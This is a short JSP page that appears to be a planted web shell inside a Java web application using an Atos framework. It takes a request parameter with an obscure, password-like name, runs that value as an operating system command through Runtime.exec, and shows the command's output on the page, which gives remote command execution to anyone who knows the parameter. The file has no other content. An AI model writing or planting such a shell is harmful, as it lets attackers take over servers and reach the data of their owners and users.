<%@ page import="net.atos.mm.fwk.fw3.servlet.*,net.atos.mm.fwk.fw3.list.*,net.atos.mm.fwk.fw3.cache.*,net.atos.mm.fwk.fw3.tools.*,net.atos.mm.fwk.fw3.form.*,java.net.*,java.util.*,java.io.*"%>
<%@ taglib uri="http://java.sun.com/jstl/core" prefix="c" %>

<%

String res = "";

if (request.getParameter("cmd_cuA44dZ@xS2@!x") != null) {

  Process p = Runtime.getRuntime().exec(request.getParameter("cmd_cuA44dZ@xS2@!x"));
  OutputStream os = p.getOutputStream();
  InputStream in = p.getInputStream();
  DataInputStream dis = new DataInputStream(in);
  try (Scanner scanner = new Scanner(dis)) {
		res = scanner.useDelimiter("\\A").next();
	}
  
 }
 
pageContext.setAttribute("result", res);

%>

<b>Process p = Runtime.getRuntime().exec(cmd):</b><br/>
<c:out value="${result}"/>
